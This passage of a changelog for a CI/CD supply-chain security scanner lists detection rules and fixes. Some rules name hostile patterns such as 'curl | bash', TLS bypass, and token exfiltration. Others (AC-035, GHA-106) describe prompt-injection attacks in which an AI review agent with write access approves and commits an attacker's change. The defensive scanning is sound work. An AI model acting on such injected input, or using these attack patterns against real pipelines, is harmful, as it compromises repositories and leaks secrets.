  entry; ENTRA-004 now credits ``authenticationStrength`` as MFA. In
  CloudFormation, KMS-002 stops flagging ``kms:*`` granted to the
  account root (the AWS-recommended default key policy), CA-003 stops
  flagging an ``aws:PrincipalOrgID`` scoped wildcard, and CF-002 stops
  flagging a ``{{resolve:secretsmanager:...}}`` dynamic reference.
- **Rule audit, batch 2: high-severity FP/FN/example fixes across Argo,
  Buildkite, Bitbucket, CircleCI, AWS, and CloudFormation.** TAINT-007
  now follows tainted outputs through a ``steps:`` orchestrator (it only
  matched ``{{tasks...}}`` before, missing every ``{{steps...}}`` graph).
  TAINT-005 recognizes ``BUILDKITE_PULL_REQUEST_TITLE`` as a tainted
  source. BK-005 detects a privileged ``docker`` plugin (``privileged:
  true`` / host-socket mount), not only ``docker run`` commands. CB-008
  and CB-011 now scan single-line inline JSON buildspecs (the shape the
  CodeBuild API emits), and CB-011 in CloudFormation no longer
  example-suppresses an IOC nested under a ``test:`` key. SM-001 matches
  a CodeBuild-referenced secret exactly instead of by the substring
  ``"arn"`` (which flagged every secret), and credits a ``!GetAtt``
  rotation schedule. BB-017 stops flagging ``curl -H "...$TOKEN" URL >
  out.json`` (the redirect saves the response, not the token). BB-010
  fires only on a ``pull-requests:`` artifact-to-deploy handover, not a
  trusted ``branches:`` release. The CC-008, BB-003, CA-003, and LMB-003
  proof-of-exploit examples were corrected so their Vulnerable fragment
  fires and their Safe fragment passes.
- **Rule audit, batch 3: broken proof-of-exploit examples across Cloud
  Build, CircleCI, Bitbucket, Azure Pipelines, Argo, CloudFormation, and
  AWS.** Twenty-eight rules carried an ``exploit_example`` whose
  Vulnerable fragment never fired, whose Safe fragment was itself
  flagged, or that did not parse at all; each is now repaired and pinned
  with a strong-check regression test (Vulnerable fires, Safe passes).
  Cloud Build GCB-004 / GCB-006 / GCB-012 / GCB-019 and Azure ADO-030
  used YAML flow-collection forms (``env: [X=${...}]``,
  ``pool: { name: ${{ ... }} }``) that a parser rejects. GCB-003,
  GCB-011, Bitbucket BB-011 / BB-017 / BB-025, CircleCI CC-026,
  CloudFormation S3-005 / CF-003 / IAM-002 / IAM-004 / IAM-005 / IAM-006,
  and AWS CA-004 / CB-011 / IAM-002 had a Vulnerable fragment the rule
  never flagged (a secret kept out of the scanned fields, a ``curl -k``
  split across args, vendor example credentials the scanner suppresses,
  an undeclared trust document, a too-short base64 blob, an ``s3:*``
  literal the wildcard check does not match, a bare policy statement with
  no enclosing document). The pinning examples GCB-001, CC-003, and
  ARGO-001 used a placeholder digest that is not valid 64-hex, so their
  Safe half was flagged; ADO-001 advised an ``@2.x`` task version the pin
  check rejects; CloudFormation ECR-003 / ECR-006 and AWS ECR-006
  presented an org-scoped wildcard or a scheme-prefixed registry host as
  Safe that the check still flags. AWS IAM-002's ``docs_note`` no longer
  claims it catches service-prefix wildcards like ``s3:*`` (that is
  IAM-006).
- **Rule audit, batch 4: false-positive fixes across Cloud Build,
  CircleCI, Azure Pipelines, Buildkite, Argo, Bitbucket, AWS, and
  CloudFormation.** Documented-safe idioms that the checks wrongly
  flagged now pass, each pinned by a regression test that also confirms
  a genuine violation still fires. GCB-004 scans only step ``args`` /
  ``entrypoint`` for a user substitution, so the recommended ``env:``
  remediation clears. CC-004 anchors its secret-name match on segment
  boundaries (``TOKENIZER_VERSION`` / ``SECRET_SCANNING_ENABLED`` are no
  longer secret-like). The shared ``curl``-insecure detector matches
  ``-k`` case-sensitively (curl's ``-K`` is ``--config``, not a TLS
  bypass), and the shared go-insecure and pip-hash detectors ignore a
  commented-out ``export`` and a quoted tooling package respectively.
  CC-025 drops ``{{ .Revision }}`` (a content-addressed commit SHA is not
  attacker-controllable for cache poisoning); CC-029 accepts CircleCI's
  legacy ``:YYYYMM-NN`` machine-image tags as pinned. ADO-002 adds a word
  boundary so a tainted ``$BR`` no longer matches ``$BRANCHX``; ADO-027
  scans only script-step bodies, not free-text fields. BK-013 treats
  ``release`` / ``promote`` as deploy intent only as a label's leading
  verb (not in "Build release artifact"). ARGO-006 excludes cache /
  partition keys and ``*_KEY_PATH`` reference names from its weak
  name-based match. BB-005 honors a global ``options.max-time``. LMB-003
  exempts ARN/name-reference env vars (``DB_SECRET_ARN``). CW-001 stays
  silent in accounts with no CodeBuild projects. CCM-002 accepts a
  ``!Ref`` / ``!GetAtt`` to an in-template KMS key as a customer-managed
  CMK. Azure storage retention rules (AZMON-002, AZMON-005) treat
  ``days=0`` with retention enabled as indefinite (compliant); AZSQL-001
  accepts Managed HSM and sovereign-cloud key vaults; AZST-006 reports a
  missing key-creation-time as advisory rather than a hard failure.
- **Rule audit, batch 4: accuracy fixes to rule titles.** AZST-005's
  title no longer asserts an unverified absence ("blob lifecycle policy
  should be reviewed"); CCM-003's title no longer claims a cross-account
  comparison the check does not perform.
- **Rule audit, batch 5: false-negative fixes across AWS, Argo, Azure
  Pipelines, CircleCI, CloudFormation, Buildkite, Bitbucket, ArgoCD,
  Cloud Build, Azure cloud, and Composer.** Detections that missed real
  violations now catch them, each pinned by tests confirming the
  previously-missed case fires, a benign neighbor still passes, and the
  existing true positive still fires. Partition and representation
  coverage: IAM-001 and CCM-003 recognize ``AdministratorAccess`` and
  trigger ARNs in the aws-cn and aws-us-gov partitions; ECR-003 (CFN)
  matches a list-form ``{AWS: ['*']}`` wildcard principal. Scope
  coverage: ARGO-001 and ARGO-002 scan ``initContainers`` and
  ``sidecars``; CC-019 scans reusable ``commands:`` and ``when:`` /
  ``unless:`` step groups; LMB-002 flags a Lambda function URL whose
  target is a cross-stack ARN; BB-020 inspects a step-level ``clone:``;
  GCB-023 scans ``dir`` / ``id`` / ``waitFor``; PBAC-003 covers IPv6
  ``::/0`` egress. Detector accuracy: ADO-017 matches ``--network=host``;
  ADO-023 matches inline ``git -c http.sslVerify=false``; CC-015 drops a
  blob fallback that passed on an incidental token mention; CC-031
  accepts underscore OIDC role params; PBAC-005 requires every executable
  action to carry its own role (approval gates excluded); EB-001 credits
  a no-state-filter EventBridge rule; CW-001 reads metric-math alarms;
  CA-001 and CP-002 stop crediting an AWS-managed key as a customer CMK.
  Tool catalog: kaniko and ``buildkite-agent artifact upload`` are
  recognized as artifact producers (gating ARGO-009 / BK-009); cdxgen
  (ARGO-010), ``notation sign`` (ADO-006), and the circleci/attestation
  orb (CC-024) are credited; GCB-008 recognizes a scanner used as a step
  image. Hardening: AZNW-002 requires the flow log to be enabled;
  AZVM-003 stops treating Trusted Launch as Just-in-Time access; BB-016
  scopes its ephemeral check to the step's own ``runs-on`` labels; BB-001
  requires full semver for pipe tags; COMPOSER-004 matches base64
  passwords containing ``/``; COMPOSER-009 stops treating a literal ``$``
  as a placeholder. CA-001 and PBAC-003 titles were reworded to match
  what they detect.

## [1.7.1] - 2026-06-01

### Changed

- **Proof-of-exploit examples on three Azure cloud MEDIUM rules.** The
  Azure parallel of the GCP exposure cherry-picks, again the only
  cloud-posture rules with a concrete reachability primitive: AKV-003
  (a Key Vault whose firewall default action is ``Allow``, so its
  secrets are reachable from the public internet behind only an Azure
  AD token), AZAPP-005 (an App Service still accepting plain FTP, which
  leaks publish-profile credentials and file contents in cleartext),
  and ACR-005 (a container registry without tag immutability, so a
  pushed tag can be overwritten in place with a backdoored image) now
  carry a prose ``exploit_example``.
- **Proof-of-exploit examples on three GCP exposure MEDIUM rules.** The
  backfill's first reach into the live cloud-posture providers, which
  are posture-weighted, so only the rules with a concrete reachability
  primitive get one: GCNET-001 (the default VPC's pre-populated
  allow-SSH / RDP-from-0.0.0.0/0 firewall rules), GCCE-003 (the
  interactive serial console, whose output leaks boot-time secrets to
  any holder of ``compute.instances.getSerialPortOutput``), and GCCE-005
  (an instance honoring project-wide SSH keys, so one
  ``setCommonInstanceMetadata`` write is shell across the fleet) now
  carry an ``exploit_example`` (prose, since the cloud-posture rules
  scan live API state rather than a config file).
- **Proof-of-exploit examples on three CloudFormation AWS MEDIUM
  rules.** The CFN-template counterparts of the Terraform second tranche
  (same shared AWS model): PBAC-002 (a CodeBuild ``ServiceRole`` shared
  across projects), CCM-003 (a CodeCommit ``Triggers[*].DestinationArn``
  that is a literal cross-account SNS / Lambda ARN), and S3-005 (an
  artifact bucket with no ``aws:SecureTransport`` deny) now carry an
  ``exploit_example``.
- **Proof-of-exploit examples on three Terraform AWS MEDIUM rules.** A
  second tranche of the Terraform AWS pack beyond the CI/CD five: the
  rules there with a concrete primitive rather than encryption /
  logging posture. PBAC-002 (a CodeBuild ``service_role`` shared across
  projects, so a build compromise in one inherits the others'
  permissions), CCM-003 (an ``aws_codecommit_trigger`` whose
  ``destination_arn`` is a literal cross-account SNS / Lambda ARN,
  leaking repository events outside the account), and S3-005 (an
  artifact bucket with no ``aws:SecureTransport`` deny, so a plaintext
  fetch can be read or swapped on-path) now carry an ``exploit_example``.
- **Proof-of-exploit examples on five Dockerfile MEDIUM rules.** A clean
  pack to continue the backfill: every remaining MEDIUM rule in the
  Dockerfile provider carries a concrete primitive rather than posture.
  DF-015 (``chmod 777`` makes an executables directory world-writable,
  so a non-root process overwrites a trusted binary), DF-017 (a
  world-writable ``PATH`` entry ahead of the system bins, a shadowing
  PATH hijack), DF-018 (a ``chown`` of a system path hands the runtime
  user ownership of ``/usr``), DF-022 (``npm install`` resolves against
  the live registry instead of the committed lockfile), and DF-030
  (``NODE_OPTIONS`` opens the V8 inspector or preloads a module on every
  ``node`` the image runs) now carry an ``exploit_example``.

### Fixed

- **Docker image publish unblocked.** The `docker-publish` workflow's
  Docker Scout gate now sets `only-fixed: true` alongside
  `only-severities: critical,high`, so it blocks promotion on
  *remediable* critical/high CVEs but no longer strands a release on
  unfixed-upstream CVEs in base packages the image doesn't use (Debian
  `perl-base`, pulled in by `python:slim`, had 1 critical + 4 high
  CVEs all marked "not fixed" — which silently blocked the v1.6.0 and
  v1.7.0 image promotions). The gate re-blocks automatically once
  upstream ships a fix.
- **Docker promote step retries transient registry errors.** The
  `docker-publish` promote loop now retries each `imagetools create`
  up to three times with linear backoff. A one-off Docker Hub 403 on
  the final tag had left Docker Hub `:latest` pointing at the prior
  release while `:${version}` published correctly, so the retry keeps
  a flaky push from half-promoting the manifest. An exhausted retry
  still fails the step, so a tag is never silently skipped.

## [1.7.0] - 2026-05-31

### Added

- **``--config-strict``.** Promotes an unknown config-file key from the
  default warn-and-drop to a hard error (exit 2) before a real scan, so a
  misplaced key (e.g. ``fail_on`` written at the top level instead of
  under ``gate:``) fails fast instead of silently disabling the setting.
  Distinct from ``--config-check``, which is a standalone preflight that
  reports unknown keys and exits 3 without scanning; ``--config-strict``
  guards a normal scan and is a no-op when the config is clean.
- **``--warn-expiring-suppressions DAYS``.** Makes the soon-to-expire
  ignore-rule forewarning window configurable (was a hardcoded, always-on
  14 days). Accepts ``7`` / ``7d``; ``0`` or ``off`` / ``none`` /
  ``never`` disables the forewarning (already-expired rules are still
  reported). Default ``14d``. Wired through ``GateConfig.expiry_warning_days``.
- **PyPI behavioral-trust signals (PYPI-019, PYPI-020, LOW).** The PyPI
  parallels of NPM-015 / NPM-016, both ``--resolve-remote``-gated and
  scoped to direct dependencies. PYPI-019 flags a direct dependency
  whose latest release ships no PEP 740 provenance attestation (from
  the PyPI JSON API's per-file ``provenance`` field). PYPI-020 resolves
  the dependency's GitHub repo from ``info.project_urls`` and queries
  the OpenSSF Scorecard API (reusing ``_primitives/scorecard``),
  flagging upstreams below 5/10 or failing Dangerous-Workflow. The
  single-publisher analog (NPM-014) is not shipped: PyPI exposes no
  reliable maintainer-account-list API. pypi 17 -> 19.
- **CI Go-module-verification rules (GHA-110, GL-037, CC-033, HIGH).**
  A shared primitive (``_primitives/go_insecure_env.py``) plus three
  per-provider rules flag a CI pipeline that disables Go module
  integrity verification via env / variables / inline ``export``:
  ``GOFLAGS=-insecure``, ``GOSUMDB=off``, ``GONOSUMCHECK``, any
  ``GOINSECURE``, or a broad ``GOPRIVATE`` / ``GONOSUMDB`` glob (the
  env-var twin of GOMOD-001; ``GOPROXY=off`` / ``direct`` and scoped
  ``GOPRIVATE`` are not flagged). GHA-110 walks workflow / job / step
  ``env:`` + ``run:``; GL-037 walks global + job ``variables:`` +
  scripts; CC-033 walks job + run-step ``environment:`` + run commands.
  github 100 -> 101, gitlab 38 -> 39, circleci 32 -> 33.
- **Weak-coverage provider deepening: deferred fourth picks.** Five
  rules across four providers. nuget: NUGET-017 (public gallery active
  alongside a private feed, not disabled in
  ``<disabledPackageSources>``, HIGH); 18 -> 19. cargo: CARGO-014 (no
  committed cargo-deny / cargo-vet / cargo-audit gate, LOW); 13 -> 14.
  pulumi: PULUMI-014 (ESC ``environment:`` import without a
  project / org qualifier, MEDIUM); 13 -> 14. argocd: ARGOCD-016 (Helm
  ``valueFiles`` from a remote URL, HIGH), ARGOCD-018 (custom resource
  health / action Lua in ``argocd-cm``, MEDIUM); 16 -> 18. The cargo
  loader gained a probe for committed audit-gate config files. All five
  mapped across the standards registries and the provider / standards
  docs regenerated.
- **Weak-coverage provider deepening: cargo, helm.** Six rules closing
  the two packs that needed a loader extension. cargo: CARGO-011
  (``build.rs`` compile-time network / process / ``include!``, HIGH),
  CARGO-012 (``.cargo/config.toml`` source ``replace-with`` or
  linker ``rustflags``, HIGH), CARGO-013 (``Cargo.lock`` package
  resolved off crates.io, MEDIUM); 10 -> 13. helm: HELM-015 (``oci://``
  dependency pinned only by a mutable tag, HIGH), HELM-016 (default
  secret in ``values.yaml``, HIGH), HELM-017 (``tpl`` of an untrusted
  ``.Values`` value, chart SSTI, HIGH); 14 -> 17. The cargo loader now
  reads ``build.rs`` / ``.cargo/config.toml`` / the ``Cargo.lock``
  body; the helm ``Chart`` now carries the parsed ``values.yaml`` and
  ``templates/`` texts. All six mapped across the standards registries
  and the provider / standards docs regenerated.
- **Weak-coverage provider deepening: gomod, rubygems, maven.** Nine
  rules continuing the coverage-pass deepening, the three packs that
  needed no new base-loader reads. gomod: GOMOD-011 (`tool` directive
  pulls a build-time executable, MEDIUM), GOMOD-012 (`require` /
  `replace` targets a bare-IP / explicit-port host, HIGH); 10 -> 12.
  rubygems: GEM-011 (Bundler `plugin` runs at install time, HIGH),
  GEM-012 (per-gem `:source` override, MEDIUM), GEM-013 (git gem over
  `git://` / `http://`, HIGH); 10 -> 13. maven: MVN-015 (command-running
  plugin bound to the build lifecycle, build-time RCE that survives a
  version pin, HIGH), MVN-016 (`build.gradle` `allowInsecureProtocol =
  true`, HIGH), MVN-017 (`<server>` with a `<privateKey>` + plaintext
  `<passphrase>`, HIGH), MVN-018 (`distributionManagement` release repo
  accepts `-SNAPSHOT` artifacts, MEDIUM); 14 -> 18. All nine mapped
  across the standards registries and the provider / standards docs
  regenerated.
- **NuGet dependency-confusion and build-execution batch (NUGET-016 /
  NUGET-018 / NUGET-019, HIGH).** NUGET-016 flags a `NuGet.config` that
  adds a private feed without a `<clear/>`, so `nuget.org` is still
  inherited and a public package can shadow an internal name (the Birsan
  dependency-confusion class NUGET-007 structurally misses when only the
  internal feed is listed). NUGET-018 flags build-time MSBuild execution
  (an `<Exec>` wired to a build / restore phase, or an `<Import>` of a
  package's generated `build/` path). NUGET-019 is the NUGET-012
  follow-up: `signatureValidationMode=require` with an empty or absent
  `<trustedSigners>` is a no-op. All three reuse NUGET-012's re-parse
  pattern. nuget rule count 15 -> 18.
- **Weak-coverage provider deepening: composer, pulumi, argocd, pypi.**
  Fourteen rules closing supply-chain gaps the roadmap's coverage pass
  flagged. composer: COMPOSER-011 (external VCS repository re-points a
  package), COMPOSER-012 (disables Packagist / marks a custom repo
  canonical), COMPOSER-013 (`config.disable-tls`), COMPOSER-014
  (`minimum-stability` lowered without `prefer-stable`); 10 -> 14.
  pulumi: PULUMI-011 (plugin from a custom download server), PULUMI-012
  (plugin version unpinned), PULUMI-013 (dynamic provider runs code at
  deploy time); 10 -> 13. argocd: ARGOCD-014 (web terminal /
  `exec.enabled`, CRITICAL), ARGOCD-015 (Kustomize `--enable-helm`),
  ARGOCD-017 (in-cluster Application from a mutable source); 13 -> 16.
  pypi: PYPI-015 (direct artifact URL), PYPI-016 (primary `--index-url`
  repointed off PyPI), PYPI-017 (remote `--find-links`), PYPI-018
  (`--no-binary` forces the sdist build path); 13 -> 17.
- **NPM-014: direct dependency relies on a single npm publisher (LOW).**
  Flags a direct dependency whose npm `maintainers` array (the accounts
  with publish access) has exactly one entry, the single-point-of-
  compromise / account-takeover blast radius behind the axios, chalk,
  and lodash class of supply-chain incidents. Network-dependent: reads
  the publisher list from the same `registry.npmjs.org` packument the
  NPM-008 cooldown gate already fetches under `--resolve-remote`, so it
  adds no extra requests, and passes silently when resolution is off.
  Scoped to direct deps; LOW severity by design (a single publisher is
  ubiquitous, so it stays below the default `--fail-on` gate while still
  surfacing in a report). npm rule count 13 -> 14. Inspired by a review
  of `proof-of-commitment` / getcommit.dev. 16 tests.
- **NPM-015 / NPM-016: provenance gap + OpenSSF Scorecard (LOW).** The
  other two behavioral supply-chain signals from the
  `proof-of-commitment` review. NPM-015 flags a direct dependency whose
  latest version ships no build-provenance attestation
  (`dist.attestations`), so it can't be cryptographically traced to its
  source commit and CI build, the guarantee this project ships on its
  own wheel (SLSA / PEP 740). NPM-016 resolves each direct dependency's
  GitHub repo from its packument and queries the OpenSSF Scorecard API
  (`api.securityscorecards.dev`), flagging upstreams that score below
  5/10 or fail the Dangerous-Workflow check. Both reuse the packument
  the cooldown/single-publisher passes already cache (NPM-016 adds one
  external API per linked repo), are `--resolve-remote`-gated, scoped to
  direct deps, LOW severity (posture signals below the default
  `--fail-on` gate), and mapped to OWASP, ESF, NIST 800-53, NIST CSF 2,
  SOC 2, and PCI DSS. npm rule count 14 -> 16. 35 tests.
- **GHA-107 / GHA-108: runtime egress control for sensitive workflows
  (MEDIUM / LOW).** GHA-107 flags a `step-security/harden-runner` step
  left in `egress-policy: audit` (also the default when the input is
  omitted), which records outbound traffic but blocks nothing, so the
  exfiltration path the agent exists to close stays open. GHA-108 is an
  advisory rule: a workflow that mints an OIDC token (`id-token: write`)
  or gates a job on a deployment `environment:` but runs no
  egress-control agent at all has credentials worth stealing and no
  runtime defense-in-depth against a compromised dependency or action
  shipping them off the runner. Both map to CICD-SEC-7 / CICD-SEC-10,
  ESF-D-BUILD-ENV, and CWE-693, and are wired across the standards
  packs. GHA rule count 97 -> 99.
- **GHA-109: harden-runner is not the first step (LOW).** Completes the
  harden-runner pack. Fires when a job uses `step-security/harden-runner`
  but at least one step (a `checkout`, a `run:`, a setup action) runs
  before it, so that earlier step's outbound traffic is neither recorded
  nor filtered, harden-runner only covers what happens after it starts.
  Passes when it's the first step or the job doesn't use it. LOW
  severity (the common shape, a checkout placed first, is a small gap
  with a one-line fix). CICD-SEC-7 / CICD-SEC-10, ESF-D-BUILD-ENV,
  CWE-696. GHA rule count 99 -> 100.
- **AC-035: AI agent is both reviewer and committer (CRITICAL).** New
  attack chain pairing GHA-103 (AI review bot on an untrusted trigger
  without an environment gate) with GHA-104 (agent pushes directly) OR
  GHA-106 (agent holds a write-scoped token) on the same workflow. The
  AI both ingests attacker-authored input and can write back, so a
  prompt-injection payload (HackerBot-Claw) makes it approve and
  commit its own malicious change with no human in the loop. Per-
  workflow co-occurrence; OR-leg deduped to one chain per workflow.
  T1195.002 / T1059 / T1078.004. Chain count 48 -> 49 (35 AC).
- **AC-036: untrusted-code execution with no egress containment
  (HIGH).** New attack chain pairing an execution leg (GHA-003 script
  injection, GHA-035 github-script injection, GHA-016 `curl | bash`, or
  GHA-044 build-tool PPE) with an egress leg (GHA-107 harden-runner in
  audit mode, or GHA-108 no agent at all) on the same workflow.
  Attacker-influenced code runs while nothing blocks outbound traffic,
  so it can exfiltrate the OIDC token / GITHUB_TOKEN / secrets. Models
  missing egress control as a severity amplifier: GHA-107 / GHA-108
  alone are LOW advisories, but paired with a code-execution primitive
  they are the last-line-of-defense gap harden-runner's block mode
  closes. Reachability confirmed (and promoted to HIGH confidence) when
  the legs share a job via job-anchor intersection; co-occurrence
  otherwise. T1059 / T1552 / T1041. Chain count 49 -> 50 (36 AC).
- **GHA-106: AI agent CLI runs with a write-scoped GITHUB_TOKEN
  (HIGH).** Fires when a job invokes an agentic CLI (`claude` /
  `gemini` / `q chat` / `cursor-agent` / `aider` / `openhands` /
  `goose`) and its effective `permissions:` grant `write-all`, the
  legacy global `write`, or any of `contents` / `packages` / `actions`
  / `deployments` set to `write`. The agent reads untrusted input at
  runtime (issue / PR bodies, review comments), so a prompt-injection
  payload (the HackerBot-Claw vector) acts with the token's full write
  scope. Sits upstream of GHA-104 (agent + explicit push) and is
  broader than GHA-061 (App-token mint filter); job-level
  `permissions:` correctly override the workflow block. Lower-impact
  scopes (`pull-requests` / `issues` / `checks` / `id-token`) and the
  missing-block case (GHA-004's domain) are not flagged. MEDIUM
  confidence, mapped across all 12 applicable standards. GHA rule
  count 96 -> 97; catalog 1073 -> 1074. 10 unit tests + a per-check
  real-example pair.
- **GHA-105: self-hosted runner reachable from an untrusted PR
  trigger (HIGH).** Fires when a workflow's `on:` includes
  `pull_request` or `pull_request_target` and at least one job's
  `runs-on:` names a self-hosted runner (bare `self-hosted` string, a
  list containing it, or the long-form `{ group, labels }` dict). Fork
  / PR code then executes on persistent infrastructure the org owns,
  exposing cached credentials, the internal network, and every later
  job the runner services. Complements GHA-012 (ephemeral marker) and
  GHA-036 (`runs-on` interpolation). MEDIUM confidence (can't tell a
  public repo from a private one with only trusted contributors),
  mapped across all 11 applicable standards. GHA rule count 95 -> 96;
  catalog 1072 -> 1073. 10 unit tests + a per-check real-example pair.
- **Fixer discoverability (`--list-fixers`).** New early-exit flag
  that lists every check ID with a registered autofixer, one line per
  ID as `ID  SEVERITY  TIER  TITLE`, and exits without scanning.
  `--safety safe|unsafe|all` narrows the listing by tier (`safe` is
  the default `--fix` mode; `unsafe` needs `--fix=unsafe`). Surfaces
  the full 111-fixer set so users can tell at a glance which rules
  have a fixer and which tier each belongs to. Pipes into `grep` for
  a provider prefix. Severity and title come from the same registry
  `--explain` reads, so a new fixer auto-lists. Documented under
  `--man autofix` and `docs/usage.md`. 8 new tests.
- **Contributor tooling: one-command pre-PR gate and a rule scaffold.**
  `scripts/preflight.py` runs the same gates CI does (ruff lint,
  doc-freshness, strict mypy, pytest) in one command and prints a
  pass/fail summary; `--quick` swaps the full suite for the fast
  drift/framework subset. `scripts/new_rule.py` scaffolds a rule module
  plus its test stub, picks the next free ID, and prints the remaining
  drift-gate checklist. Adds a "Your first rule in 10 minutes" guide, a
  devcontainer, CODEOWNERS, a PR template, and `make check` / `fmt` /
  `types` / `fast-test` / `docs-all` / `new-rule` targets.

### Changed

- **Proof-of-exploit examples on five Kubernetes MEDIUM rules.** The
  IaC backfill's highest-yield pack so far (concrete cluster
  primitives): K8S-011 (a workload on the namespace ``default``
  ServiceAccount), K8S-012 (``automountServiceAccountToken`` left on, so
  a compromised container reads the mounted API token), K8S-039
  (``shareProcessNamespace: true`` letting a sidecar read a neighbor's
  secrets from ``/proc``), K8S-038 (a NetworkPolicy with an empty
  ``from:`` / ``to:`` that allows all peers), and K8S-028 (a
  ``hostPort`` that bypasses Services and NetworkPolicies) now carry an
  ``exploit_example``. The hardening / resource-limit / probe rules stay
  ``None`` by design.
- **Proof-of-exploit examples on five CloudFormation AWS-CI/CD MEDIUM
  rules.** The CloudFormation-template counterparts of the Terraform
  batch (same shared AWS CI/CD model): CB-007 (an
  ``AWS::CodeBuild::Project`` with ``Triggers.Webhook`` but no
  ``FilterGroups``), IAM-006 (sensitive actions with ``Resource: "*"``),
  CP-005 (a production CodePipeline stage with no preceding Manual
  approval), PBAC-003 (a build SG with ``0.0.0.0/0`` egress), and CB-009
  (a build image on a mutable tag) now carry an ``exploit_example``.
  The rest of the pack is posture and stays ``None`` by design.
- **Proof-of-exploit examples on five Terraform AWS-CI/CD MEDIUM
  rules.** Begins extending the backfill into the IaC providers:
  CB-007 (an ``aws_codebuild_webhook`` with no ``filter_group``, so a
  fork PR runs in the build account), IAM-006 (a CI/CD role policy
  pairing sensitive actions with ``Resource = "*"``), CP-005 (a
  production CodePipeline Deploy stage with no preceding ManualApproval),
  PBAC-003 (a CodeBuild security group with ``0.0.0.0/0`` all-port
  egress), and CB-009 (a build image pinned by a mutable tag) now carry
  an ``exploit_example``. The remaining Terraform MEDIUM rules are
  posture (CMK encryption, logging, retention, versioning) and stay
  ``None`` by design.
- **Proof-of-exploit examples on two Tekton MEDIUM rules.** Completes
  the MEDIUM backfill across every CI provider: TKN-007 (a TaskRun /
  PipelineRun on the namespace ``default`` ServiceAccount, whose
  mounted API token carries whatever RBAC is bound to ``default``) and
  TKN-014 (unpinned package installs) now carry an ``exploit_example``.
  Every concrete-primitive MEDIUM rule across all providers now has one;
  the remaining gaps are absence-of-hygiene posture rules (no SBOM /
  SLSA / signing / vuln-scan), which stay ``None`` by design.
- **Proof-of-exploit examples on two Drone MEDIUM rules.** Extends the
  MEDIUM backfill to Drone: DR-008 (``pull: never`` reuses a cached
  image without re-verifying the digest, so a poisoned cache entry
  keeps running) and DR-010 (unpinned package installs) now carry an
  ``exploit_example``. Drone's other MEDIUM rules (trigger filter,
  recursive submodule clone) already had one or are posture-only.
- **Proof-of-exploit examples on four Buildkite MEDIUM rules.** Extends
  the MEDIUM backfill to Buildkite pipelines: BK-007 (deploy step with
  no preceding manual ``block:``), BK-008 (TLS verification disabled in
  a step command, an MITM opening), BK-013 (deploy step with no
  ``branches:`` filter), and BK-014 (unpinned package installs) now
  carry an ``exploit_example``. Buildkite has no AWS or cache rule, so
  this batch is four. SBOM / SLSA / signing / vuln-scan / timeout rules
  stay ``None`` by design.
- **Proof-of-exploit examples on five Jenkins MEDIUM rules.** Extends
  the MEDIUM backfill to Jenkinsfiles: JF-004 (long-lived AWS keys via
  ``withCredentials``), JF-005 (deploy stage with no ``input`` approval),
  JF-031 (git / path / tarball install), and two Jenkins-specific gaps,
  JF-012 (a ``load`` of unpinned Groovy that runs with the build's
  permissions) and JF-024 (an ``input`` gate with no ``submitter``, so
  anyone with Build permission approves) now carry an
  ``exploit_example``. SBOM / SLSA / signing / vuln-scan / timeout rules
  stay ``None`` by design.
- **Proof-of-exploit examples on five Azure DevOps MEDIUM rules.**
  Extends the MEDIUM backfill to Azure Pipelines: ADO-004 (deployment
  job with no ``environment:`` binding), ADO-012 (Cache@2 key from
  ``$(System.PullRequest.*)``), ADO-014 (long-lived AWS keys), ADO-028
  (git / path / tarball install), and ADO-009 (a container image
  pinned by a mutable version tag the registry can repoint, not a
  sha256 digest) now carry an ``exploit_example``. SBOM / SLSA /
  signing / vuln-scan / timeout rules stay ``None`` by design.
- **Proof-of-exploit examples on five Bitbucket MEDIUM rules.** Extends
  the MEDIUM backfill to Bitbucket Pipelines: BB-004 (deploy step with
  no ``deployment:`` gate), BB-011 (long-lived AWS keys), BB-018
  (cache-key poisoning), BB-027 (git / path / tarball install), and
  BB-009 (a third-party ``pipe:`` pinned by a mutable version tag the
  registry can repoint, not a sha256 digest) now carry an
  ``exploit_example``. SBOM / SLSA / signing / vuln-scan / max-time
  rules stay ``None`` by design.
- **Proof-of-exploit examples on five CircleCI MEDIUM rules.** Extends
  the MEDIUM backfill to CircleCI: CC-005 (long-lived AWS keys in a job
  ``environment:`` block), CC-009 (deploy job with no ``type: approval``
  gate), CC-025 (cache-key poisoning), CC-028 (git / path / tarball
  install), and the CircleCI-specific CC-012 (``setup: true`` dynamic
  config lets a fork PR inject arbitrary pipeline config) now carry an
  ``exploit_example``. SBOM / SLSA / signing / vuln-scan / resource
  rules stay ``None`` by design.
- **Proof-of-exploit examples on five GitLab MEDIUM rules.** Mirrors
  the GitHub Actions MEDIUM batch on the GitLab side: GL-004 (ungated
  deploy), GL-012 (cache-key poisoning), GL-013 (long-lived AWS keys),
  GL-027 (git / path / tarball install), and the GitLab-specific GL-029
  (manual deploy defaulting to ``allow_failure: true``, a gate that
  blocks nothing) now carry an ``exploit_example``. SBOM / SLSA /
  signing / vuln-scan / timeout rules stay ``None`` by design.
- **Proof-of-exploit examples on seven HIGH cloud-posture rules.**
  Closes the last HIGH-severity gaps in the exploit-example backfill:
  ACR-002 (public registry), AKV-002 (no Key Vault purge protection),
  AZST-002 (non-HTTPS storage), ENTRA-003 (service-principal password
  credential), GAR-002 (public Artifact Registry repo), GCIAM-003
  (unconstrained service-account token creator), and GCKMS-002 (public
  KMS key) now carry an ``exploit_example``. Every CRITICAL and HIGH
  rule now ships one, except GAR-001 (no vulnerability scanning), which
  stays ``None`` by design like the other absence-of-hygiene posture
  rules.
- **Proof-of-exploit examples on five GitHub Actions MEDIUM rules.**
  GHA-005 (long-lived AWS keys), GHA-011 (cache-key poisoning), GHA-014
  (ungated deploy job), GHA-029 (install from a git / path / tarball
  source), and GHA-034 (``secrets: inherit``) now carry an
  ``exploit_example``, surfaced under ``--explain`` / ``--inline-explain``
  and in the HTML and JSON reports. Continues the opportunistic MEDIUM
  backfill (every CRITICAL / HIGH rule already ships one); the
  absence-of-hygiene posture rules (no SBOM / SLSA / signing) keep no
  example by design, since the gap isn't a concrete exploitation
  primitive.
- **NPM-009 names the dependency that introduced each new transitive.**
  Findings now read `<name> (via <parent>)` instead of just the bare
  package name, so a reviewer knows which direct dependency's bump to
  audit. The pnpm (v6 packages + v9 snapshots) and yarn (classic +
  Berry) lockfile synthesizers now preserve each package's declared
  dependency edges, which they previously dropped, so attribution works
  across every lockfile format alongside `package-lock.json`. The rule
  walks the edge graph to the nearest manifest dependency and falls back
  to the immediate declaring parent for a deep transitive with no
  manifest ancestor.
- **Cleaner default terminal report.** The findings table sizes to its
  content instead of padding out to the full terminal width, so a scan
  on a wide terminal no longer leaves a lake of empty space. Resource
